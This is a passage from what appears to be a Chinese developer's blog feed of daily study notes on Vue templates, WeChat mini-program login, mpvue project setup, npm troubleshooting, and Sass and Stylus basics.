class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"4"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"5"</span> &#125;</span></span><br><span class="line"><span class="undefined">                ]</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    1</span></span><br><span class="line"><span class="comment">    haha</span></span><br><span class="line"><span class="comment">    2</span></span><br><span class="line"><span class="comment">    haha</span></span><br><span class="line"><span class="comment">    3</span></span><br><span class="line"><span class="comment">    haha</span></span><br><span class="line"><span class="comment">    4</span></span><br><span class="line"><span class="comment">    haha</span></span><br><span class="line"><span class="comment">    5</span></span><br><span class="line"><span class="comment">    haha</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="vue中的template属性"><a href="#vue中的template属性" class="headerlink" title="vue中的template属性"></a>vue中的template属性</h3><blockquote><p>将实例中template属性值进行编译，并将编译后的dom替换掉vue实例绑定的元素，如果该vue实例绑定的元素中存在内容，这些内容会直接被覆盖。</p><p>1）如果vue实例中有template属性，会将该属性值进行编译，将编译后的虚拟dom直接替换掉vue实例绑定的元素（即el绑定的那个元素）；<br>2）template属性中的dom结构只能有一个根元素，如果有多个根元素需要使用v-if、v-else、v-else-if设置成只显示其中一个根元素；<br>3）在该属性对应的属性值中可以使用vue实例data、methods中定义的数据。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">'tem'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template中的盒子1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template中的盒子2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="javascript">            template:<span class="string">'#tem'</span></span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--这样只会显示第一个盒子，但是如果像下面这样，就可以显示两个盒子--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">'tem'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template中的盒子1</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template中的盒子2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：组件模板只能有一个根元素 </strong></p><p>为什么呢？查了一些资料，貌似与渲染更新和diff算法有关，这个后面学习到的时候再看。</p><h2 id="简单写了一个小程序"><a href="#简单写了一个小程序" class="headerlink" title="简单写了一个小程序"></a>简单写了一个小程序</h2><h3 id="如何调用微信登录"><a href="#如何调用微信登录" class="headerlink" title="如何调用微信登录"></a>如何调用微信登录</h3><p>登录按钮设置open-type和bindgetuserinfo属性，如下： </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> </span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">'btn'</span> </span></span><br><span class="line"><span class="tag"><span class="attr">wx:if</span>=<span class="string">"&#123;&#123;canIUse&#125;&#125;"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">open-type</span>=<span class="string">"getUserInfo"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">bindgetuserinfo</span>=<span class="string">"bindGetUserInfo"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">canIUse: wx.canIUse(<span class="string">'button.open-type.getUserInfo'</span>)</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 查看是否授权</span></span><br><span class="line">wx.getSetting(&#123;</span><br><span class="line">success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (res.authSetting[<span class="string">'scope.userInfo'</span>]) &#123;</span><br><span class="line"><span class="comment">// 已经授权，可以直接调用 getUserInfo 获取头像昵称</span></span><br><span class="line">wx.getUserInfo(&#123;</span><br><span class="line">success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(res.userInfo)</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">bindGetUserInfo: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(e.detail.userInfo)</span><br><span class="line"><span class="keyword">if</span> (e.detail.userInfo) &#123;</span><br><span class="line">wx.redirectTo(&#123;<span class="attr">url</span>:<span class="string">''</span>&#125;)<span class="comment">//跳转界面</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//用户按了拒绝按钮</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.20</title>
      <link href="2020/04/20/%E6%97%A5%E5%B8%B8-2020.4.20/"/>
      <url>2020/04/20/%E6%97%A5%E5%B8%B8-2020.4.20/</url>
      
        <content type="html"><![CDATA[<ul><li>mpvue的目录结构</li><li>关于一些指令的学习</li><li>成功运行项目</li><li>什么是开发环境，生产环境，测试环境</li></ul><a id="more"></a><h2 id="mpvue的目录结构"><a href="#mpvue的目录结构" class="headerlink" title="mpvue的目录结构"></a>mpvue的目录结构</h2><p>这是新建的一个mpvue项目，先来了解一下他的目录结构。</p><p><img src="https://s1.ax1x.com/2020/04/20/JMIhY4.png" alt="JMIhY4.png"></p><ul><li>build：用于项目编译打包的node.js脚本和webpack配置文件，不需要我们去修改</li><li>config：包含了用于开发和生产环境下的不同配置，<code>dev.env.js</code>用于开发环境，<code>prod.env.js</code>用于生产环境 </li><li>dist：在执行npm run dev后由src编译生成的微信小程序文件。 </li><li>node_modules：项目依赖，这个目录有90M大小，包含了很多模块。</li><li>src：<code>src</code>目录是我们主要进行小程序功能编写的地方。 包含如下文件：<ul><li>components：在实际开发中，我们可以尽量将界面上可复用的部分，提取成vue组件放入该目录</li><li>pages：存放小程序的页面。请遵循每个小程序页面放入一个单独子目录的组织形式</li><li>utils：可选（可删）。可以将代码中一些公用工具函数组织成模块放入该目录下</li><li>app.json：小程序一些配置：页面，window，tabBar，items等</li><li>main.js + App.vue：这两个是入口文件</li></ul></li><li>static：用于存放各种小程序本地静态资源，如图片、文本文件等。可通过相对路径或绝对路径进行访问 </li><li>package.json：项目的主配置文件，包含了项目的基本描述信息、项目所依赖、以及可执行的脚本信息。</li><li>project.config.json ：小程序项目的配置文件，其中记录了小程序的appid、代码主目录、以及编译选项等</li></ul><h2 id="关于一些指令的学习"><a href="#关于一些指令的学习" class="headerlink" title="关于一些指令的学习"></a>关于一些指令的学习</h2><ul><li>npm install</li><li>npm run dev</li><li>npm  run build</li><li>npm run build –report</li></ul><h3 id="npm-install"><a href="#npm-install" class="headerlink" title="npm install"></a>npm install</h3><p><code>npm install</code>=<code>npm i</code>。在git clone项目的时候，项目文件中并没有 node_modules文件夹，项目的依赖文件可能很大。直接执行，npm会根据package.json配置文件中的依赖配置下载安装。</p><ul><li><code>-global</code>=<code>-g</code>，全局安装，安装后的包位于系统预设目录下</li><li><code>--save</code>=<code>-S</code>，安装的包将写入package.json里面的dependencies，dependencies：生产环境需要依赖的库</li><li><code>--save-dev</code>=<code>-D</code>，安装的包将写入packege.json里面的devDependencies，devdependencies：只有开发环境下需要依赖的库</li></ul><h3 id="npm-run-dev-与-npm-run-build"><a href="#npm-run-dev-与-npm-run-build" class="headerlink" title="npm run dev 与 npm  run build"></a>npm run dev 与 npm  run build</h3><p>首先在项目中的package.son中找到有如下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;dev&quot;: &quot;node build/dev-server.js wx&quot;,</span><br><span class="line">&quot;build&quot;: &quot;node build/build.js wx&quot;,</span><br><span class="line"></span><br><span class="line">//运行”npm run dev”的时候执行的是build/dev-server.js文件，</span><br><span class="line">//运行”npm run build”的时候执行的是build/build.js文件。</span><br></pre></td></tr></table></figure><p>那我们去看一下bulid文件夹里的这两个文件，此处参考于<a href="https://www.jb51.net/article/154579.htm" target="_blank" rel="noopener">这里</a></p><p>（1）npm run dev 执行的文件build/dev-server.js文件，执行了：</p><ul><li>检查node和npm的版本</li><li>引入相关插件和配置</li><li>创建express服务器和webpack编译器</li><li>配置开发中间件（webpack-dev-middleware）和热重载中间件（webpack-hot-middleware）</li><li>挂载代理服务和中间件</li><li>配置静态资源</li><li>启动服务器监听特定端口</li><li>自动打开浏览器并打开特定网址</li></ul><p>（2）npm run build的时候执行的是build/build.js文件，构建环境下的配置，</p><blockquote><p>执行npm run build，实际上执行了build/build.js,通过webpack的一系列配置及插件，将文件打包合并丑化，并创建dist目录，放置编译打包后的文件，这将是未来用在生产环境的包。 </p></blockquote><p><strong>错误</strong>：在使用<code>npm run dev</code>运行项目时，出现了如下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vue packages version mismatch:</span><br><span class="line">- vue@1.0.18</span><br><span class="line">- mpvue-template-compiler@1.4.6</span><br><span class="line"></span><br><span class="line">//可见这是版本不匹配的原因，那么我们来下载一个版本使其相同就好了</span><br></pre></td></tr></table></figure><p>运行<code>cnpm install vue@1.4.6 --save</code>，依旧报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Install fail! Error: [vue@1.4.6] Can&apos;t find package vue&apos;s version: 1.4.6</span><br><span class="line">//找不到1.4.6版本</span><br></pre></td></tr></table></figure><p>那我们来看一下vue目前有哪些版本，执行<code>npm view vue versions</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//看了一下还真没有1.4.6</span><br><span class="line">//这时候我们运行 cnpm install mpvue-template-compiler@1.0.18 --save</span><br></pre></td></tr></table></figure><p>安装成功，重新运行<code>npm run dev</code>，还是有问题…….</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">No parser and no filepath given, using &apos;babel&apos; the parser now but this will throw an error in t</span><br><span class="line">he future. Please specify a parser or a filepath so one can be inferred.</span><br><span class="line"></span><br><span class="line">//是prettier版本导致的</span><br><span class="line">//Prettier 是一个有见识的代码格式化工具。它通过解析代码并使用自己的规则重新打印它,并考虑最大行长来强制执行一致的样式,并在必要时包装代码。</span><br></pre></td></tr></table></figure><p>直接输入<code>cnpm install prettier@~1.12.0 -D</code>后再<code>npm run dev</code>运行成功。项目中出现dist目录，导入微信开发者工具，项目运行成功~</p><p>下面运行<code>npm run build</code>,可以看出来文件已经被打包成功。弹出的网页中显示了如下三种size</p><ul><li>Stat size：统计大小</li><li>Parsed size：解析大小</li><li>Gzipped size：压缩大小</li></ul><h2 id="开发环境，生产环境，测试环境"><a href="#开发环境，生产环境，测试环境" class="headerlink" title="开发环境，生产环境，测试环境"></a>开发环境，生产环境，测试环境</h2><p>1：开发环境：项目尚且在编码阶段，我们的代码一般在开发环境中 不会在生产环境中。</p><p>2：测试环境：项目完成测试，修改bug阶段</p><p>3：生产环境：项目数据前端后台已经跑通，部署之后，有客户使用，访问，就是网站正式运行了</p><p><strong>开发到正式上线的流程：</strong></p><p>应该是先在开发环境 中开发完成，测试环境测试，保证程序没有问题后，再上传到生产环境中。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.17</title>
      <link href="2020/04/17/%E6%97%A5%E5%B8%B8-2020.4.17/"/>
      <url>2020/04/17/%E6%97%A5%E5%B8%B8-2020.4.17/</url>
      
        <content type="html"><![CDATA[<ul><li>mpvue框架是什么</li><li>mpvue框架的特点</li><li>快速创建一个mpvue项目</li></ul><a id="more"></a><h2 id="1-mpvue框架是什么"><a href="#1-mpvue框架是什么" class="headerlink" title="1. mpvue框架是什么"></a>1. mpvue框架是什么</h2><p>根据官方文档的介绍：</p><blockquote><p><code>mpvue</code> 是一个使用 <a href="https://vuejs.org/" target="_blank" rel="noopener">Vue.js</a> 开发小程序的前端框架。框架基于 <code>Vue.js</code> 核心，<code>mpvue</code> 修改了 <code>Vue.js</code> 的 <a href="http://mpvue.com/mpvue" target="_blank" rel="noopener">runtime</a> 和 <a href="http://mpvue.com/mpvue-template-compiler" target="_blank" rel="noopener">compiler</a> 实现，使其可以运行在小程序环境中，从而为小程序开发引入了整套 <code>Vue.js</code> 开发体验。</p></blockquote><p>名称的由来：</p><ul><li><code>mp</code>：mini program 的缩写</li><li><code>mpvue</code>：Vue.js in mini program</li></ul><h2 id="2-mpvue框架的特点"><a href="#2-mpvue框架的特点" class="headerlink" title="2. mpvue框架的特点"></a>2. mpvue框架的特点</h2><p>根据官方文档的介绍：</p><ul><li>彻底的组件化开发能力：提高代码复用性</li><li>完整的 <code>Vue.js</code> 开发体验</li><li>方便的 <code>Vuex</code> 数据管理方案：方便构建复杂应用</li><li>快捷的 <code>webpack</code> 构建机制：自定义构建策略、开发阶段 hotReload</li><li>支持使用 npm 外部依赖</li><li>使用 <code>Vue.js</code> 命令行工具 vue-cli 快速初始化项目</li><li>H5 代码转换编译成小程序目标代码的能力</li></ul><h2 id="3-快速创建一个mpvue项目"><a href="#3-快速创建一个mpvue项目" class="headerlink" title="3. 快速创建一个mpvue项目"></a>3. 快速创建一个mpvue项目</h2><p>因为昨天已经安装好了vue-cli,直接输入命令<code>vue init mpvue/mpvue-quickstart my-project</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">报错： vue-cli · Failed to download repo mpvue/mpvue-quickstart: getaddrinfo ENOTFOUND codeload.github.com codeload.github.com:443</span><br><span class="line"></span><br><span class="line">出现了和昨天一样的问题，我把昨天的方法试了一下，还是不好使，调了好久。</span><br><span class="line">最后把公司的VPN关了，竟然通了！！！</span><br></pre></td></tr></table></figure><p>一路回车下去就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">? Project name my-project</span><br><span class="line">? wxmp appid touristappid</span><br><span class="line">? Project description A Mpvue project</span><br><span class="line">? Author jinjingxuan &lt;915397405@qq.com&gt;</span><br><span class="line">? Vue build runtime</span><br><span class="line">? Use Vuex? Yes</span><br><span class="line">? Use ESLint to lint your code? Yes</span><br><span class="line">? 小程序测试，敬请关注最新微信开发者工具的“测试报告”功能</span><br></pre></td></tr></table></figure><p>然后执行如下三条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd my-project</span><br><span class="line">$ npm install</span><br><span class="line">$ npm run dev</span><br></pre></td></tr></table></figure><p>运行成功~my-project导入微信开发者工具即可，截图如下：</p><p><img src="https://s1.ax1x.com/2020/04/17/JZtXNt.png" alt="JZtXNt.png"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.16</title>
      <link href="2020/04/16/%E6%97%A5%E5%B8%B8-2020.4.16/"/>
      <url>2020/04/16/%E6%97%A5%E5%B8%B8-2020.4.16/</url>
      
        <content type="html"><![CDATA[<ul><li>关于Vue全家桶，构建一个vue初始项目</li><li>熟悉小程序开发，安装微信开发者工具</li><li>了解Sass,Stylus</li></ul><a id="more"></a><h2 id="1-Vue全家桶-构建项目"><a href="#1-Vue全家桶-构建项目" class="headerlink" title="1. Vue全家桶+构建项目"></a>1. Vue全家桶+构建项目</h2><ul><li>vue-router：路由</li><li>vuex：状态管理</li><li>axios：http请求包</li><li>vue-cli：项目构建工具</li></ul><h3 id="（1）安装vue-cli"><a href="#（1）安装vue-cli" class="headerlink" title="（1）安装vue-cli"></a>（1）安装vue-cli</h3><ul><li>安装：<code>cnpm install --global vue-cli</code></li><li>安装成功：输入<code>vue -V</code>查看版本</li></ul><h3 id="（2）构建项目"><a href="#（2）构建项目" class="headerlink" title="（2）构建项目"></a>（2）构建项目</h3><ul><li>新建文件夹，输入<code>vue init webpack vuetest</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">报错： vue-cli · Failed to download repo vuejs-templates/webpack: getaddrinfo ENOTFOUND codeload.github.com codeload.github.com:443</span><br><span class="line"></span><br><span class="line">这是因为GitHub的IP地址无法访问所导致，在控制台输入ping github.com一直显示超时</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">1.打开 hosts文件，地址：C:\Windows\System32\drivers\etc </span><br><span class="line">2. 然后在hosts文件中添加：</span><br><span class="line">192.30.253.112 github.com</span><br><span class="line">151.101.88.249 github.global.ssl.fastly.net</span><br><span class="line">3.重新输入ping github.com，连接成功</span><br><span class="line"></span><br><span class="line">Hosts文件主要作用是定义IP地址和主机名的映射关系，它的主要作用是能加快域名解析</span><br><span class="line">修改hosts文件时，需要解决权限问题：</span><br><span class="line">1.右键 -&gt; 属性 -&gt; 安全 -&gt; 编辑</span><br><span class="line">2.找到你的用户</span><br><span class="line">3.在下方修改此用户对该文件的读写权限</span><br></pre></td></tr></table></figure><ul><li>成功回车之后，弹出如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">? Project name vuetest                        //项目名</span><br><span class="line">? Project description A Vue.js project        //描述</span><br><span class="line">? Author jinjingxuan &lt;915397405@qq.com&gt;       //作者</span><br><span class="line">? Vue build standalone                          </span><br><span class="line">? Install vue-router? Yes                     //安装vue-router</span><br><span class="line">? Use ESLint to lint your code? Yes           //安装ESLint代码风格管理工具</span><br><span class="line">? Pick an ESLint preset Standard</span><br><span class="line">? Set up unit tests Yes                       //单元测试</span><br><span class="line">? Pick a test runner jest</span><br><span class="line">? Setup e2e tests with Nightwatch? Yes        //e2e测试</span><br><span class="line">? Should we run `npm install` for you after the project has been created? (recommended) npm</span><br><span class="line">//在项目构建完使用npm install安装依赖，可以选择否，手动输入</span><br></pre></td></tr></table></figure><ul><li>构建完成之后，<strong>cd进入构建好的文件夹</strong>，输入<code>cnpm install</code>安装依赖</li><li>安装好依赖后，输入<code>npm run dev</code>启动项目</li></ul><p><img src="https://s1.ax1x.com/2020/04/16/Jk0FT1.png" alt="Jk0FT1.png"></p><h2 id="2-熟悉小程序开发，安装微信开发者工具"><a href="#2-熟悉小程序开发，安装微信开发者工具" class="headerlink" title="2.熟悉小程序开发，安装微信开发者工具"></a>2.熟悉小程序开发，安装微信开发者工具</h2><ul><li>注册账号</li><li>安装微信开发者工具</li><li>文件类型：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.wxml：微信模板文件，类似网页开发的html文件。</span><br><span class="line">.wxss：微信样式表文件，用于定于页面样式。</span><br><span class="line">.js：脚本文件，代码逻辑写在这。</span><br><span class="line">.json：静态数据配置文件。</span><br></pre></td></tr></table></figure><ul><li>初始化第一个项目，截图如下：</li></ul><p><img src="https://s1.ax1x.com/2020/04/16/JkYTsI.png" alt="JkYTsI.png"></p><h2 id="3-了解Sass-Stylus"><a href="#3-了解Sass-Stylus" class="headerlink" title="3.了解Sass,Stylus"></a>3.了解Sass,Stylus</h2><p>Sass,Stylus都是css预处理器，除了这两种之外还有less等。</p><h3 id="（1）Sass的安装与使用"><a href="#（1）Sass的安装与使用" class="headerlink" title="（1）Sass的安装与使用"></a>（1）Sass的安装与使用</h3><p>安装Sass：<code>cnpm install -g sass</code></p><p><strong>使用Sass</strong>：</p><ul><li>新建文件test.scss</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义变量与值 */</span></span><br><span class="line"><span class="variable">$bgcolor</span>: lightblue;</span><br><span class="line"><span class="variable">$textcolor</span>: darkblue;</span><br><span class="line"><span class="variable">$fontsize</span>: <span class="number">18px</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用变量 */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="variable">$bgcolor</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$textcolor</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="variable">$fontsize</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>转化为css文件：<code>sass test.scss test.css</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">charset</span> <span class="string">"UTF-8"</span>;</span><br><span class="line"><span class="comment">/* 定义变量与值 */</span></span><br><span class="line"><span class="comment">/* 使用变量 */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">  <span class="attribute">color</span>: darkblue;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*# sourceMappingURL=test.css.map */</span></span><br></pre></td></tr></table></figure><h3 id="（2）Stylus的安装与使用"><a href="#（2）Stylus的安装与使用" class="headerlink" title="（2）Stylus的安装与使用"></a>（2）Stylus的安装与使用</h3><p>安装Stylus：<code>cnpm install -g stylus</code></p><p><strong>使用Sass</strong>：</p><ul><li>新建文件test.styl</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 定义变量与值 */</span><br><span class="line">$bgcolor=lightblue;</span><br><span class="line">$textcolor=darkblue;</span><br><span class="line">$fontsize=18px;</span><br><span class="line"></span><br><span class="line">/* 使用变量 */</span><br><span class="line">body &#123;</span><br><span class="line">  background-color: $bgcolor;</span><br><span class="line">  color: $textcolor;</span><br><span class="line">  font-size: $fontsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>转换为css文件：<code>stylus test.styl</code>，会自动生成test.css</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义变量与值 */</span></span><br><span class="line"><span class="comment">/* 使用变量 */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#add8e6</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#00008b</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Sass与Stylus的对比"><a href="#（3）Sass与Stylus的对比" class="headerlink" title="（3）Sass与Stylus的对比"></a>（3）Sass与Stylus的对比</h3><p>参考于<a href="https://segmentfault.com/a/1190000008013566" target="_blank" rel="noopener">这篇文章</a></p><ol><li>变量</li></ol><p><code>sass</code>允许使用变量，所有的变量以<code>$</code>开头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$blue: #1875e7;</span><br><span class="line">div &#123;</span><br><span class="line">   color: $blue</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>stylus</code>也允许使用变量，变量名的<code>$</code>是可选的，变量值可以是表达式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">color = blue 或者  $color = blue</span><br><span class="line">div</span><br><span class="line">    color: color</span><br></pre></td></tr></table></figure><ol start="2"><li>计算属性</li></ol><p><code>sass</code>允许在代码中使用算式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    margin: (14px/2);</span><br><span class="line">    top: 50px + 100px;</span><br><span class="line">    right: $var * 10%;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>stylus</code>同样也支持在代码中使用算式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">body</span><br><span class="line">   margin: 